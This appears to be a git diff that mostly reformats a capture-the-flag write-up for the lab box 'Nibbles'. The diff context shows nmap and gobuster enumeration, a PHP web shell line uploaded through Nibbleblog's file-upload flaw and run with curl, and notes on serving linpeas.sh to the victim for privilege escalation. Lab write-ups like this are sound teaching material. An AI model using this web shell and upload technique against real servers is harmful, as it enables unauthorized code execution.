@@ -6,23 +6,27 @@ tags: [gobuster]
 ---
 
 # Introduction
+
 Let's walk through the box **Nibbles**, an easy-rated Linux box that showcases common enumeration tactics, basic web application exploitation, and a file-related misconfiguration to escalate privileges.
 
->For this writeup I will say that the IP adresses are the following: 
+>For this writeup I will say that the IP adresses are the following:
 >
-> - __attack machine__ is `10.10.10.1`
-> 
-> - __target machine__ is `10.10.10.2`
+> - **attack machine** is `10.10.10.1`
+>
+> - **target machine** is `10.10.10.2`
 {: .prompt-warning }
 
 # Enumeration
+
 Firstly let's do some basic enumeration with nmap.
 We will begin with a simple quick scan to discover common open ports and service versions:
+
 ````console
 nmap -sV --open 10.10.10.2
 ````
 
 We quickly see two open ports:
+
 ````console
 PORT   STATE SERVICE VERSION
 22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
@@ -31,11 +35,13 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ````
 
 Let's start another scan, a full one this time, to be sure to not miss any unusual port:
+
 ````
 nmap -sV -p- 10.10.10.2
 ````
 
 While the full scan is running we can check the two known open ports with the defaults nmap scripts:
+
 ````
 nmap -sC -p 22,80 10.10.10.2
 ````
@@ -47,6 +53,7 @@ Unfortunatly the full scan and the script scan didn't finish with something usef
 When we open firefox on the address there is just one message displayed: Hello world!
 
 Checking the page source reveal an interesting comment:
+
 ````html
 <!-- /nibbleblog/ directory. Nothing interesting here! -->
 ````
@@ -54,11 +61,13 @@ Checking the page source reveal an interesting comment:
 A simple web research on **Nibbleblog** shows that it's a PHP based blog engine with a well know File Upload Vulnerability which allows an authenticated attacker to upload and execute PHP code on the server. We still don't know yey which version on Nibbleblog is running this server but it's still something good to know.
 
 Now it's time to use gobuster to discover hidden directories:
+
 ````console
 gobuster dir -w /path/to/wordlist/common.txt -u 10.10.10.2
 ````
 
 Nothing interesting with this scan. Let's try now to add the directory found in the html comment:
+
 ````console
 gobuster dir -w /path/to/wordlist/common.txt -u 10.10.10.2/nibbleblog/
 ==========================================================================
@@ -78,9 +87,10 @@ gobuster dir -w /path/to/wordlist/common.txt -u 10.10.10.2/nibbleblog/
 Many directories found here!
 
 After looking at each here are the interesting ones for now:
+
 - admin/    -> Many files here
 - admin.php -> login form
-- content/  -> 
+- content/  ->
 - README/ -> confirm the vulnerable version
 
 Can't bruteforce login -> error message to blacklist us
@@ -101,11 +111,13 @@ Attempting to make a new page and embed code or upload files does not seem like 
 On the configuration page of the My image plugin we can see an upload form. Here we will try to send some PHP code to the server:
 
 Firstly let's try to print the id command by savin the below code into a test.php file and uploading it:
+
 ````php
 <?php system('id'); ?>
 ````
 
 Now if we cURL the good URL:
+
 ````bash
 curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php
 
@@ -119,7 +131,8 @@ uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
 
 > here is the user flag !
 
-# Privilege Escalation 
+# Privilege Escalation
+
 - unzip the zip and see a monitor.sh
 - let's move linpeas.sh to the victim machine
 - python -m http.server 8000
